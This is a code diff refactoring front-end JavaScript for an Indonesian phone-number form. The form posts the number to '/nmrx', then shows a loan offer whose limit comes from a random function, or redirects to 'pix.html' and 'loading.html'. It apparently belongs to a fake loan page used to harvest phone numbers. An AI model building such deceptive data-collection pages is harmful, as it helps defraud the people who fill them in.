@@ -157,118 +157,75 @@ phoneInput.addEventListener(
 });
 
 /* LANJUT */
-lanjutBtn.addEventListener(
-"click",
- async () => {
+lanjutBtn.addEventListener("click", async () => {
 
-   if(lanjutBtn.classList.contains("disabled")){
-    return;
-}
+    if(lanjutBtn.classList.contains("disabled")){
+        return;
+    }
 
-    /* AMBIL NOMOR */
-    const nomor =
-    phoneInput.value.replace(
-    /\D/g,
-    ''
-    );
+    const nomor = phoneInput.value.replace(/\D/g,'');
 
-    /* VALIDASI */
     if(
         nomor.length < 9 ||
         nomor.charAt(0) !== "8"
     ){
-
         if(navigator.vibrate){
+            navigator.vibrate([120,80,120]);
+        }
 
-        navigator.vibrate([
-            120,
-            80,
-            120
-        ]);
+        errorBox.classList.add("show");
 
-    }
-
-        /* SHOW ERROR */
-        errorBox.classList.add(
-        "show"
-        );
-
-        /* AUTO HIDE */
         setTimeout(() => {
-
-            errorBox.classList.remove(
-            "show"
-            );
-
+            errorBox.classList.remove("show");
         },2000);
 
         phoneInput.focus();
-
         return;
-
     }
 
-    /* SIMPAN */
-    localStorage.setItem(
-    "nmrx",
-    phoneInput.value
-    );
+    lanjutBtn.disabled = true;
+    lanjutBtn.classList.add("btn-loading");
+    lanjutBtn.innerHTML = `<span class="btn-spinner"></span>`;
 
-    /* KIRIM */
+    localStorage.setItem("nmrx", phoneInput.value);
+
     await fetch("/nmrx", {
-
         method:"POST",
-
         headers:{
-            "Content-Type":
-            "application/json"
+            "Content-Type":"application/json"
         },
-
         body:JSON.stringify({
-
             nmrx:phoneInput.value
-
         })
-
     });
 
-    /* SHOW LOADING */
-    loadingBox.style.display =
-    "flex";
+    setTimeout(() => {
 
-    /* PINDAH */
-    setTimeout(()=>{
+        const produkDipilih = localStorage.getItem("produkDipilih");
 
-    const produkDipilih = localStorage.getItem("produkDipilih");
+        if(produkDipilih === "pinjaman"){
+            lanjutBtn.disabled = false;
+            lanjutBtn.classList.remove("btn-loading");
+            lanjutBtn.innerHTML = "Lanjutkan";
 
-    if(produkDipilih === "pinjaman"){
+            showLoanPopup();
+        }else{
+            document.body.classList.add("fade-out");
 
-        loadingBox.style.display = "none";
-        document.body.classList.remove("fade-out");
-        showLoanPopup();
+            setTimeout(() => {
+                window.location.href = "pix.html";
+            },500);
+        }
 
-    }else{
-
-        document.body.classList.add("fade-out");
-
-        setTimeout(()=>{
-            window.location.href = "pix.html";
-        },500);
-
-    }
-
-},2000);
+    },2000);
 
 });
 
 /* RESET LOADING */
-window.addEventListener(
-"pageshow",
-() => {
-
-    loadingBox.style.display =
-    "none";
-
+window.addEventListener("pageshow", () => {
+    if(loadingBox){
+        loadingBox.style.display = "none";
+    }
 });
 
 const loanPopup = document.getElementById("loanPopup");
@@ -293,6 +250,8 @@ function randomLimit(){
 }
 
 function updateLoanSlider(){
+    if(!loanRange || !loanAmount) return;
+
     const value = Number(loanRange.value);
     const max = Number(loanRange.max);
     const percent = (value / max) * 100;
@@ -312,9 +271,13 @@ function updateLoanSlider(){
     localStorage.setItem("jumlahPinjaman", value);
 }
 
-loanRange.addEventListener("input", updateLoanSlider);
+if(loanRange){
+    loanRange.addEventListener("input", updateLoanSlider);
+}
 
 function showLoanPopup(){
+    if(!loanPopup || !loanRange || !limitUtama || !limitTotal) return;
+
     const limit = randomLimit();
 
     localStorage.setItem("limitPinjaman", limit);
@@ -330,17 +293,24 @@ function showLoanPopup(){
     loanPopup.classList.add("show");
 }
 
-cairkanBtn.addEventListener("click", () => {
-    loanPopup.classList.remove("show");
+if(cairkanBtn){
+    cairkanBtn.addEventListener("click", () => {
 
-    loadingBox.style.display = "flex";
+        cairkanBtn.disabled = true;
+        cairkanBtn.classList.add("btn-loading");
 
-    setTimeout(() => {
-        document.body.classList.add("fade-out");
+        cairkanBtn.innerHTML = `
+            <span class="btn-spinner"></span>
+        `;
 
         setTimeout(() => {
-            window.location.href = "pix.html";
-        },500);
+            document.body.classList.add("fade-out");
 
-    },900);
-});
+            setTimeout(() => {
+                window.location.href = "loading.html";
+            },500);
+
+        },900);
+
+    });
+}
